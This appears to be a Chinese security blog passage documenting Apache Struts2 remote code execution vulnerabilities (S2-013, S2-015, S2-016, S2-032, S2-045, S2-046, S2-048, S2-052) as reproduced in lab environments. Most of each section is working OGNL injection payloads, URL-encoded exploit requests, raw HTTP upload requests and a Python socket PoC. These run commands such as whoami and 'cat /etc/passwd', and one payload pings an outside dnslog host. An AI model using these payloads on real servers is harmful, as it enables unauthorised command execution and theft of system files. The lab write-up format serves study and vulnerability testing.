<img src="/2022/03/05/Structs2%E6%BC%8F%E6%B4%9E%E9%9B%86%E5%90%88/image-20220309162617953.png" class title="image-20220309162617953">



<h3 id="S2-013"><a href="#S2-013" class="headerlink" title="S2-013"></a>S2-013</h3><h4 id="漏洞简介-6"><a href="#漏洞简介-6" class="headerlink" title="漏洞简介"></a>漏洞简介</h4><p>Struts2 标签中 <code>&lt;s:a&gt;</code> 和 <code>&lt;s:url&gt;</code> 都包含一个 includeParams 属性，其值可设置为 none，get 或 all，参考官方其对应意义如下：</p>
<ol>
<li>none - 链接不包含请求的任意参数值（默认）</li>
<li>get - 链接只包含 GET 请求中的参数和其值</li>
<li>all - 链接包含 GET 和 POST 所有参数和其值</li>
</ol>
<p><code>&lt;s:a&gt;</code>用来显示一个超链接，当<code>includeParams=all</code>的时候，会将本次请求的GET和POST参数都放在URL的GET参数上。在放置参数的过程中会将参数进行OGNL渲染，造成任意命令执行漏洞。</p>
<h4 id="漏洞版本-5"><a href="#漏洞版本-5" class="headerlink" title="漏洞版本"></a>漏洞版本</h4><p>2.0.0 - 2.3.14.1</p>
<h4 id="漏洞探测-6"><a href="#漏洞探测-6" class="headerlink" title="漏洞探测"></a>漏洞探测</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$&#123;(#_memberAccess[&quot;allowStaticMethodAccess&quot;]=true,#a=@java.lang.Runtime@getRuntime().exec(&#x27;id&#x27;).getInputStream(),#b=new java.io.InputStreamReader(#a),#c=new java.io.BufferedReader(#b),#d=new char[50000],#c.read(#d),#out=@org.apache.struts2.ServletActionContext@getResponse().getWriter(),#out.println(#d),#out.close())&#125;</span><br><span class="line"></span><br><span class="line">// 或</span><br><span class="line"></span><br><span class="line">$&#123;#_memberAccess[&quot;allowStaticMethodAccess&quot;]=true,@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(&#x27;id&#x27;).getInputStream())&#125;</span><br></pre></td></tr></table></figure>

<p>如：<code>http://your-ip:8080/link.action?a=%24%7B%23_memberAccess%5B%22allowStaticMethodAccess%22%5D%3Dtrue%2C%23a%3D%40java.lang.Runtime%40getRuntime().exec(&#39;id&#39;).getInputStream()%2C%23b%3Dnew%20java.io.InputStreamReader(%23a)%2C%23c%3Dnew%20java.io.BufferedReader(%23b)%2C%23d%3Dnew%20char%5B50000%5D%2C%23c.read(%23d)%2C%23out%3D%40org.apache.struts2.ServletActionContext%40getResponse().getWriter()%2C%23out.println(&#39;dbapp%3D&#39;%2Bnew%20java.lang.String(%23d))%2C%23out.close()%7D</code></p>
<p>返回服务器id信息</p>
<img src="/2022/03/05/Structs2%E6%BC%8F%E6%B4%9E%E9%9B%86%E5%90%88/image-20220309163452580.png" class title="image-20220309163452580">

<h4 id="漏洞利用-6"><a href="#漏洞利用-6" class="headerlink" title="漏洞利用"></a>漏洞利用</h4><p><strong>当前用户</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/link.action?a=%24%7B%23_memberAccess%5B%22allowStaticMethodAccess%22%5D%3Dtrue%2C%23a%3D%40java.lang.Runtime%40getRuntime().exec(&#x27;whoami&#x27;).getInputStream()%2C%23b%3Dnew%20java.io.InputStreamReader(%23a)%2C%23c%3Dnew%20java.io.BufferedReader(%23b)%2C%23d%3Dnew%20char%5B50000%5D%2C%23c.read(%23d)%2C%23out%3D%40org.apache.struts2.ServletActionContext%40getResponse().getWriter()%2C%23out.println(&#x27;dbapp%3D&#x27;%2Bnew%20java.lang.String(%23d))%2C%23out.close()%7D</span><br></pre></td></tr></table></figure>

<img src="/2022/03/05/Structs2%E6%BC%8F%E6%B4%9E%E9%9B%86%E5%90%88/image-20220309163701251.png" class title="image-20220309163701251">

<p><strong>命令执行</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://192.168.211.129:8080/link.action?a=%24%7B%28%23context%5B%27xwork.MethodAccessor.denyMethodExecution%27%5D%3Dfalse%29%28%23_memberAccess%5B%27allowStaticMethodAccess%27%5D%3Dtrue%29%28@java.lang.Runtime@getRuntime%28%29.exec%28%22ping%20test.l2plmu.dnslog.cn%22%29%29%7D</span><br></pre></td></tr></table></figure>

<img src="/2022/03/05/Structs2%E6%BC%8F%E6%B4%9E%E9%9B%86%E5%90%88/image-20220309163936553.png" class title="image-20220309163936553">

<h3 id="S2-015"><a href="#S2-015" class="headerlink" title="S2-015"></a>S2-015</h3><h4 id="漏洞简介-7"><a href="#漏洞简介-7" class="headerlink" title="漏洞简介"></a>漏洞简介</h4><p>漏洞产生于配置了 Action 通配符 *，并将其作为动态值时，解析时会将其内容执行 OGNL 表达式，例如：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">package</span> <span class="attr">name</span>=<span class="string">&quot;S2-015&quot;</span> <span class="attr">extends</span>=<span class="string">&quot;struts-default&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">action</span> <span class="attr">name</span>=<span class="string">&quot;*&quot;</span> <span class="attr">class</span>=<span class="string">&quot;com.demo.action.PageAction&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">result</span>&gt;</span>/&#123;1&#125;.jsp<span class="tag">&lt;/<span class="name">result</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">action</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">package</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>上述配置能让我们访问 name.action 时使用 name.jsp 来渲染页面，但是在提取 name 并解析时，对其执行了 OGNL 表达式解析，所以导致命令执行。在实践复现的时候发现，由于 name 值的位置比较特殊，一些特殊的字符如 &#x2F; “ \ 都无法使用（转义也不行），所以在利用该点进行远程命令执行时一些带有路径的命令可能无法执行成功。</p>
<p>还有需要说明的就是在 Struts 2.3.14.1 - Struts 2.3.14.2 的更新内容中，删除了 SecurityMemberAccess 类中的  setAllowStaticMethodAccess 方法，因此在 2.3.14.2 版本以后都不能直接通过 <code>#_memberAccess[&#39;allowStaticMethodAccess&#39;]=true</code> 来修改其值达到重获静态方法调用的能力。</p>
<p>这里为了到达执行命令的目的可以用 kxlzx 提到的调用动态方法 (new java.lang.ProcessBuilder(‘calc’)).start() 来解决，另外还可以借助 Java 反射机制去间接修改：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#context[&#x27;xwork.MethodAccessor.denyMethodExecution&#x27;]=false,#m=#_memberAccess.getClass().getDeclaredField(&#x27;allowStaticMethodAccess&#x27;),#m.setAccessible(true),#m.set(#_memberAccess,true)</span><br></pre></td></tr></table></figure>

<h4 id="漏洞版本-6"><a href="#漏洞版本-6" class="headerlink" title="漏洞版本"></a>漏洞版本</h4><p>2.0.0 - 2.3.14.2</p>
<h4 id="漏洞探测-7"><a href="#漏洞探测-7" class="headerlink" title="漏洞探测"></a>漏洞探测</h4><p><strong>获取id</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/%24%7B%23context%5B%27xwork.MethodAccessor.denyMethodExecution%27%5D%3Dfalse%2C%23m%3D%23_memberAccess.getClass%28%29.getDeclaredField%28%27allowStaticMethodAccess%27%29%2C%23m.setAccessible%28true%29%2C%23m.set%28%23_memberAccess%2Ctrue%29%2C%23q%3D@org.apache.commons.io.IOUtils@toString%28@java.lang.Runtime@getRuntime%28%29.exec%28%27ls%27%29.getInputStream%28%29%29%2C%23q%7D.action</span><br></pre></td></tr></table></figure>

<img src="/2022/03/05/Structs2%E6%BC%8F%E6%B4%9E%E9%9B%86%E5%90%88/image-20220309164631462.png" class title="image-20220309164631462">

<h4 id="漏洞利用-7"><a href="#漏洞利用-7" class="headerlink" title="漏洞利用"></a>漏洞利用</h4><p><strong>查看系统文件</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">%24%7B%23context%5B%27xwork.MethodAccessor.denyMethodExecution%27%5D%3Dfalse%2C%23m%3D%23_memberAccess.getClass%28%29.getDeclaredField%28%27allowStaticMethodAccess%27%29%2C%23m.setAccessible%28true%29%2C%23m.set%28%23_memberAccess%2Ctrue%29%2C%23q%3D@org.apache.commons.io.IOUtils@toString%28@java.lang.Runtime@getRuntime%28%29.exec%28%27cat%20%2Fetc%2Fpasswd%27%29.getInputStream%28%29%29%2C%23q%7D.action</span><br></pre></td></tr></table></figure>

<img src="/2022/03/05/Structs2%E6%BC%8F%E6%B4%9E%E9%9B%86%E5%90%88/image-20220309164936562.png" class title="image-20220309164936562">



<h3 id="S2-016"><a href="#S2-016" class="headerlink" title="S2-016"></a>S2-016</h3><p>vulhub搭建环境失败，使用墨者学院进行复现</p>
<p>靶场地址:</p>
<p><a href="https://www.mozhe.cn/bug/detail/MkhJb2Jpblh4MkYrMjkrNC84UjZtUT09bW96aGUmozhe">Apache Struts2远程代码执行漏洞(S2-016)复现_命令执行_在线靶场_墨者学院_专注于网络安全人才培养 (mozhe.cn)</a></p>
<h4 id="漏洞简介-8"><a href="#漏洞简介-8" class="headerlink" title="漏洞简介"></a>漏洞简介</h4><p>Struts2的action:、redirect:和redirectAction:前缀参数在实现其功能的过程中使用了Ognl表达式，并将用户通过URL提交的内容拼接入Ognl表达式中，从而造成攻击者可以通过构造恶意URL来执行任意Java代码，进而可执行任意命令。redirect:和redirectAction:此两项前缀为Struts默认开启功能。</p>
<p>在struts2中，DefaultActionMapper类支持以”action:”、“redirect:”、”redirectAction:”作为导航或是重定向前缀，但是这些前缀后面同时可以跟OGNL表达式，由于struts2没有对这些前缀做过滤，导致利用OGNL表达式调用java静态方法执行任意系统命令</p>
<h4 id="漏洞版本-7"><a href="#漏洞版本-7" class="headerlink" title="漏洞版本"></a>漏洞版本</h4><p>2.0.0 - 2.3.15</p>
<h4 id="漏洞探测-8"><a href="#漏洞探测-8" class="headerlink" title="漏洞探测"></a>漏洞探测</h4><p>访问ip:port&#x2F;index.action?redirect:%25%7b%33%2a%34%7d，执行表达式</p>
<img src="/2022/03/05/Structs2%E6%BC%8F%E6%B4%9E%E9%9B%86%E5%90%88/image-20220310152313906.png" class title="image-20220310152313906">

<h4 id="漏洞利用-8"><a href="#漏洞利用-8" class="headerlink" title="漏洞利用"></a>漏洞利用</h4><p><strong>任意命令执行</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$&#123;#a=(new java.lang.ProcessBuilder(new java.lang.String[]&#123;&#x27;ls&#x27;,&#x27;/&#x27;&#125;)).start(),#b=#a.getInputStream(),#c=new java.io.InputStreamReader(#b),#d=new java.io.BufferedReader(#c),#e=new char[50000],#d.read(#e),#matt=#context.get(&#x27;com.opensymphony.xwork2.dispatcher.HttpServletResponse&#x27;),#matt.getWriter().println(#e),#matt.getWriter().flush(),#matt.getWriter().close()&#125;</span><br></pre></td></tr></table></figure>

<p>将其进行URL编码</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">%24%7b%23%61%3d%28%6e%65%77%20%6a%61%76%61%2e%6c%61%6e%67%2e%50%72%6f%63%65%73%73%42%75%69%6c%64%65%72%28%6e%65%77%20%6a%61%76%61%2e%6c%61%6e%67%2e%53%74%72%69%6e%67%5b%5d%7b%27%6c%73%27%2c%27%2f%27%7d%29%29%2e%73%74%61%72%74%28%29%2c%23%62%3d%23%61%2e%67%65%74%49%6e%70%75%74%53%74%72%65%61%6d%28%29%2c%23%63%3d%6e%65%77%20%6a%61%76%61%2e%69%6f%2e%49%6e%70%75%74%53%74%72%65%61%6d%52%65%61%64%65%72%28%23%62%29%2c%23%64%3d%6e%65%77%20%6a%61%76%61%2e%69%6f%2e%42%75%66%66%65%72%65%64%52%65%61%64%65%72%28%23%63%29%2c%23%65%3d%6e%65%77%20%63%68%61%72%5b%35%30%30%30%30%5d%2c%23%64%2e%72%65%61%64%28%23%65%29%2c%23%6d%61%74%74%3d%23%63%6f%6e%74%65%78%74%2e%67%65%74%28%27%63%6f%6d%2e%6f%70%65%6e%73%79%6d%70%68%6f%6e%79%2e%78%77%6f%72%6b%32%2e%64%69%73%70%61%74%63%68%65%72%2e%48%74%74%70%53%65%72%76%6c%65%74%52%65%73%70%6f%6e%73%65%27%29%2c%23%6d%61%74%74%2e%67%65%74%57%72%69%74%65%72%28%29%2e%70%72%69%6e%74%6c%6e%28%23%65%29%2c%23%6d%61%74%74%2e%67%65%74%57%72%69%74%65%72%28%29%2e%66%6c%75%73%68%28%29%2c%23%6d%61%74%74%2e%67%65%74%57%72%69%74%65%72%28%29%2e%63%6c%6f%73%65%28%29%7d</span><br></pre></td></tr></table></figure>



<p>执行后下载文件</p>
<img src="/2022/03/05/Structs2%E6%BC%8F%E6%B4%9E%E9%9B%86%E5%90%88/image-20220310152608959.png" class title="image-20220310152608959">



<p>文件内容为执行的命令ls，列举出所有文件及文件夹</p>
<img src="/2022/03/05/Structs2%E6%BC%8F%E6%B4%9E%E9%9B%86%E5%90%88/image-20220310152631918.png" class title="image-20220310152631918">



<p>看到存在key.txt文件，下面就是下载key.txt文件</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$&#123;#a=(new java.lang.ProcessBuilder(new java.lang.String[]&#123;&#x27;cat&#x27;,&#x27;key.txt&#x27;&#125;)).start(),#b=#a.getInputStream(),#c=new java.io.InputStreamReader(#b),#d=new java.io.BufferedReader(#c),#e=new char[50000],#d.read(#e),#matt=#context.get(&#x27;com.opensymphony.xwork2.dispatcher.HttpServletResponse&#x27;),#matt.getWriter().println(#e),#matt.getWriter().flush(),#matt.getWriter().close()&#125;</span><br></pre></td></tr></table></figure>

<p>使用url编码处理该poc</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">%24%7b%23%61%3d%28%6e%65%77%20%6a%61%76%61%2e%6c%61%6e%67%2e%50%72%6f%63%65%73%73%42%75%69%6c%64%65%72%28%6e%65%77%20%6a%61%76%61%2e%6c%61%6e%67%2e%53%74%72%69%6e%67%5b%5d%7b%27%63%61%74%27%2c%27%6b%65%79%2e%74%78%74%27%7d%29%29%2e%73%74%61%72%74%28%29%2c%23%62%3d%23%61%2e%67%65%74%49%6e%70%75%74%53%74%72%65%61%6d%28%29%2c%23%63%3d%6e%65%77%20%6a%61%76%61%2e%69%6f%2e%49%6e%70%75%74%53%74%72%65%61%6d%52%65%61%64%65%72%28%23%62%29%2c%23%64%3d%6e%65%77%20%6a%61%76%61%2e%69%6f%2e%42%75%66%66%65%72%65%64%52%65%61%64%65%72%28%23%63%29%2c%23%65%3d%6e%65%77%20%63%68%61%72%5b%35%30%30%30%30%5d%2c%23%64%2e%72%65%61%64%28%23%65%29%2c%23%6d%61%74%74%3d%23%63%6f%6e%74%65%78%74%2e%67%65%74%28%27%63%6f%6d%2e%6f%70%65%6e%73%79%6d%70%68%6f%6e%79%2e%78%77%6f%72%6b%32%2e%64%69%73%70%61%74%63%68%65%72%2e%48%74%74%70%53%65%72%76%6c%65%74%52%65%73%70%6f%6e%73%65%27%29%2c%23%6d%61%74%74%2e%67%65%74%57%72%69%74%65%72%28%29%2e%70%72%69%6e%74%6c%6e%28%23%65%29%2c%23%6d%61%74%74%2e%67%65%74%57%72%69%74%65%72%28%29%2e%66%6c%75%73%68%28%29%2c%23%6d%61%74%74%2e%67%65%74%57%72%69%74%65%72%28%29%2e%63%6c%6f%73%65%28%29%7d</span><br></pre></td></tr></table></figure>

<p>得到key</p>
<img src="/2022/03/05/Structs2%E6%BC%8F%E6%B4%9E%E9%9B%86%E5%90%88/image-20220310153802154.png" class title="image-20220310153802154">

<h3 id="S2-032"><a href="#S2-032" class="headerlink" title="S2-032"></a>S2-032</h3><h4 id="漏洞简介-9"><a href="#漏洞简介-9" class="headerlink" title="漏洞简介"></a>漏洞简介</h4><p>Struts2在开启了动态方法调用（Dynamic Method Invocation）的情况下，可以使用<code>method:&lt;name&gt;</code>的方式来调用名字是<code>&lt;name&gt;</code>的方法，而这个方法名将会进行OGNL表达式计算，导致远程命令执行漏洞。</p>
<h4 id="漏洞版本-8"><a href="#漏洞版本-8" class="headerlink" title="漏洞版本"></a>漏洞版本</h4><p>2.3.20 -  2.3.28 (except 2.3.20.3 and 2.3.24.3)</p>
<h4 id="漏洞探测-9"><a href="#漏洞探测-9" class="headerlink" title="漏洞探测"></a>漏洞探测</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://your-ip:8080/index.action?method:%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,%23res%3d%40org.apache.struts2.ServletActionContext%40getResponse(),%23res.setCharacterEncoding(%23parameters.encoding%5B0%5D),%23w%3d%23res.getWriter(),%23s%3dnew+java.util.Scanner(@java.lang.Runtime@getRuntime().exec(%23parameters.cmd%5B0%5D).getInputStream()).useDelimiter(%23parameters.pp%5B0%5D),%23str%3d%23s.hasNext()%3f%23s.next()%3a%23parameters.ppp%5B0%5D,%23w.print(%23str),%23w.close(),1?%23xx:%23request.toString&amp;pp=%5C%5CA&amp;ppp=%20&amp;encoding=UTF-8&amp;cmd=id</span><br></pre></td></tr></table></figure>

<p><strong>获取id值</strong></p>
<img src="/2022/03/05/Structs2%E6%BC%8F%E6%B4%9E%E9%9B%86%E5%90%88/image-20220309200932329.png" class title="image-20220309200932329">



<h4 id="漏洞利用-9"><a href="#漏洞利用-9" class="headerlink" title="漏洞利用"></a>漏洞利用</h4><p><strong>查看系统文件</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://ip:port/index.action?method:%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,%23res%3d%40org.apache.struts2.ServletActionContext%40getResponse(),%23res.setCharacterEncoding(%23parameters.encoding%5B0%5D),%23w%3d%23res.getWriter(),%23s%3dnew+java.util.Scanner(@java.lang.Runtime@getRuntime().exec(%23parameters.cmd%5B0%5D).getInputStream()).useDelimiter(%23parameters.pp%5B0%5D),%23str%3d%23s.hasNext()%3f%23s.next()%3a%23parameters.ppp%5B0%5D,%23w.print(%23str),%23w.close(),1?%23xx:%23request.toString&amp;pp=%5C%5CA&amp;ppp=%20&amp;encoding=UTF-8&amp;cmd=cat%20%2fetc%2fpasswd</span><br></pre></td></tr></table></figure>

<img src="/2022/03/05/Structs2%E6%BC%8F%E6%B4%9E%E9%9B%86%E5%90%88/image-20220309201419829.png" class title="image-20220309201419829">

<h3 id="S2-045"><a href="#S2-045" class="headerlink" title="S2-045"></a>S2-045</h3><h4 id="漏洞简介-10"><a href="#漏洞简介-10" class="headerlink" title="漏洞简介"></a>漏洞简介</h4><p>在文件上传页面，对请求体中Content-Type中插入payload可执行OGNL表达式</p>
<h4 id="漏洞版本-9"><a href="#漏洞版本-9" class="headerlink" title="漏洞版本"></a>漏洞版本</h4><p>2.3.5 -  2.3.31</p>
<p>2.5 -  2.5.10</p>
<h4 id="漏洞探测-10"><a href="#漏洞探测-10" class="headerlink" title="漏洞探测"></a>漏洞探测</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /doUpload.action HTTP/1.1</span><br><span class="line">Host: 192.168.211.129:8080</span><br><span class="line">Content-Length: 1163048</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Origin: http://192.168.211.129:8080</span><br><span class="line">Content-Type: %&#123;#context[&#x27;com.opensymphony.xwork2.dispatcher.HttpServletResponse&#x27;].addHeader(&#x27;vulhub&#x27;,233*233)&#125;.multipart/form-data</span><br><span class="line">boundary=----WebKitFormBoundarywVbGGxxB239G926l</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class="line">Referer: http://192.168.211.129:8080/doUpload.action</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Cookie: JSESSIONID=1ncvxy8v5x14j5tjyb6mbfexh</span><br><span class="line">Connection: close</span><br></pre></td></tr></table></figure>

<p>OCNL表达式成功执行</p>
<img src="/2022/03/05/Structs2%E6%BC%8F%E6%B4%9E%E9%9B%86%E5%90%88/image-20220309210227571.png" class title="image-20220309210227571">





<h4 id="漏洞利用-10"><a href="#漏洞利用-10" class="headerlink" title="漏洞利用"></a>漏洞利用</h4><p>计算表达式</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /doUpload.action HTTP/1.1</span><br><span class="line">Host: 192.168.211.129:8080</span><br><span class="line">Content-Length: 1163048</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Origin: http://192.168.211.129:8080</span><br><span class="line">Content-Type: %&#123;#context[&#x27;com.opensymphony.xwork2.dispatcher.HttpServletResponse&#x27;].addHeader(&#x27;vulhub&#x27;,12345*12345)&#125;.multipart/form-data</span><br><span class="line">boundary=----WebKitFormBoundarywVbGGxxB239G926l</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class="line">Referer: http://192.168.211.129:8080/doUpload.action</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Cookie: JSESSIONID=1ncvxy8v5x14j5tjyb6mbfexh</span><br><span class="line">Connection: close</span><br></pre></td></tr></table></figure>

<img src="/2022/03/05/Structs2%E6%BC%8F%E6%B4%9E%E9%9B%86%E5%90%88/image-20220309210540452.png" class title="image-20220309210540452">

<h3 id="S2-046"><a href="#S2-046" class="headerlink" title="S2-046"></a>S2-046</h3><h4 id="漏洞简介-11"><a href="#漏洞简介-11" class="headerlink" title="漏洞简介"></a>漏洞简介</h4><p>与s2-045类似，但是输入点在文件上传的filename值位置，并需要使用<code>\x00</code>截断。</p>
<h4 id="漏洞版本-10"><a href="#漏洞版本-10" class="headerlink" title="漏洞版本"></a>漏洞版本</h4><p>2.3.5 -  2.3.31</p>
<p> 2.5 -  2.5.10</p>
<h4 id="漏洞探测-11"><a href="#漏洞探测-11" class="headerlink" title="漏洞探测"></a>漏洞探测</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Content-Disposition: form-data; name=&quot;upload&quot;; filename=&quot;%&#123;#context[&#x27;com.opensymphony.xwork2.dispatcher.HttpServletResponse&#x27;].addHeader(&#x27;X-Test&#x27;,233*233)&#125;\x00b&quot;</span><br></pre></td></tr></table></figure>

<p>直接使用burp拦截修改filename未成功，下面使用poc进行探测</p>
<p><strong>poc</strong></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"></span><br><span class="line">q = <span class="string">b&#x27;&#x27;&#x27;------WebKitFormBoundaryXd004BVJN9pBYBL2</span></span><br><span class="line"><span class="string">Content-Disposition: form-data; name=&quot;upload&quot;; filename=&quot;%&#123;#context[&#x27;com.opensymphony.xwork2.dispatcher.HttpServletResponse&#x27;].addHeader(&#x27;X-Test&#x27;,233*233)&#125;\x00b&quot;</span></span><br><span class="line"><span class="string">Content-Type: text/plain</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">foo</span></span><br><span class="line"><span class="string">------WebKitFormBoundaryXd004BVJN9pBYBL2--&#x27;&#x27;&#x27;</span>.replace(<span class="string">b&#x27;\n&#x27;</span>, <span class="string">b&#x27;\r\n&#x27;</span>)</span><br><span class="line">p = <span class="string">b&#x27;&#x27;&#x27;POST / HTTP/1.1</span></span><br><span class="line"><span class="string">Host: localhost:8080</span></span><br><span class="line"><span class="string">Upgrade-Insecure-Requests: 1</span></span><br><span class="line"><span class="string">User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36</span></span><br><span class="line"><span class="string">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8</span></span><br><span class="line"><span class="string">Accept-Language: en-US,en;q=0.8,es;q=0.6</span></span><br><span class="line"><span class="string">Connection: close</span></span><br><span class="line"><span class="string">Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryXd004BVJN9pBYBL2</span></span><br><span class="line"><span class="string">Content-Length: %d</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span>.replace(<span class="string">b&#x27;\n&#x27;</span>, <span class="string">b&#x27;\r\n&#x27;</span>) % (<span class="built_in">len</span>(q), )</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> socket.create_connection((<span class="string">&#x27;your-ip&#x27;</span>, <span class="string">&#x27;8080&#x27;</span>), timeout=<span class="number">5</span>) <span class="keyword">as</span> conn:</span><br><span class="line">    conn.send(p + q)</span><br><span class="line">    <span class="built_in">print</span>(conn.recv(<span class="number">10240</span>).decode())</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<p>响应包中可以看到添加的表达式</p>
<img src="/2022/03/05/Structs2%E6%BC%8F%E6%B4%9E%E9%9B%86%E5%90%88/image-20220310100219241.png" class title="image-20220310100219241">

<h4 id="漏洞利用-11"><a href="#漏洞利用-11" class="headerlink" title="漏洞利用"></a>漏洞利用</h4><p>可修改poc中表达式进行命令执行</p>
<img src="/2022/03/05/Structs2%E6%BC%8F%E6%B4%9E%E9%9B%86%E5%90%88/image-20220310100505156.png" class title="image-20220310100505156">



<h3 id="S2-048"><a href="#S2-048" class="headerlink" title="S2-048"></a>S2-048</h3><h4 id="漏洞简介-12"><a href="#漏洞简介-12" class="headerlink" title="漏洞简介"></a>漏洞简介</h4><p>触发OGNL表达式的位置是<code>Gangster Name</code>这个表单。访问<code>http://your-ip:8080/showcase/</code>即可查看到struts2的测试页面。访问Integration&#x2F;Struts 1 Integration</p>
<h4 id="漏洞版本-11"><a href="#漏洞版本-11" class="headerlink" title="漏洞版本"></a>漏洞版本</h4><p>2.0.0 - 2.3.32</p>
<h4 id="漏洞探测-12"><a href="#漏洞探测-12" class="headerlink" title="漏洞探测"></a>漏洞探测</h4><p>在<code>Gangster Name</code>这个表单中输入<code>$&#123;233*233&#125;</code>即可查看执行结果（剩下两个表单随意填写）</p>
<img src="/2022/03/05/Structs2%E6%BC%8F%E6%B4%9E%E9%9B%86%E5%90%88/image-20220310102426960.png" class title="image-20220310102426960">

<p>表达式执行成功</p>
<img src="/2022/03/05/Structs2%E6%BC%8F%E6%B4%9E%E9%9B%86%E5%90%88/image-20220310102547071.png" class title="image-20220310102547071">

<h4 id="漏洞利用-12"><a href="#漏洞利用-12" class="headerlink" title="漏洞利用"></a>漏洞利用</h4><p><strong>任意命令执行</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">%&#123;(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context[&#x27;com.opensymphony.xwork2.ActionContext.container&#x27;]).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#q=@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(&#x27;id&#x27;).getInputStream())).(#q)&#125;</span><br></pre></td></tr></table></figure>



<img src="/2022/03/05/Structs2%E6%BC%8F%E6%B4%9E%E9%9B%86%E5%90%88/image-20220310102720073.png" class title="image-20220310102720073">



<h3 id="S2-052"><a href="#S2-052" class="headerlink" title="S2-052"></a>S2-052</h3><h4 id="漏洞简介-13"><a href="#漏洞简介-13" class="headerlink" title="漏洞简介"></a>漏洞简介</h4><p>Struts2-Rest-Plugin是让Struts2能够实现Restful API的一个插件，其根据Content-Type或URI扩展名来判断用户传入的数据包类型，有如下映射表：</p>
<table>
<thead>
<tr>
<th>扩展名</th>
<th>Content-Type</th>
<th>解析方法</th>
</tr>
</thead>
<tbody><tr>
<td>xml</td>
<td>application&#x2F;xml</td>
<td>xstream</td>
</tr>
<tr>
<td>json</td>
<td>application&#x2F;json</td>
<td>jsonlib或jackson(可选)</td>
</tr>
<tr>
<td>xhtml</td>
<td>application&#x2F;xhtml+xml</td>
<td>无</td>
</tr>
<tr>
<td>无</td>
<td>application&#x2F;x-www-form-urlencoded</td>
<td>无</td>
</tr>
<tr>
<td>无</td>
<td>multipart&#x2F;form-data</td>
<td>无</td>
</tr>
</tbody></table>
<p>jsonlib无法引入任意对象，而xstream在默认情况下是可以引入任意对象的（针对1.5.x以前的版本），方法就是直接通过xml的tag name指定需要实例化的类名：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;classname&gt;&lt;/classname&gt;</span><br><span class="line">//或者</span><br><span class="line">&lt;paramname class=&quot;classname&quot;&gt;&lt;/paramname&gt;</span><br></pre></td></tr></table></figure>

<p>所以，我们可以通过反序列化引入任意类造成远程命令执行漏洞，只需要找到一个在Struts2库中适用的gedget。</p>
<h4 id="漏洞版本-12"><a href="#漏洞版本-12" class="headerlink" title="漏洞版本"></a>漏洞版本</h4><p>2.1.2 -  2.3.33,</p>
<p>2.5 -  2.5.12</p>
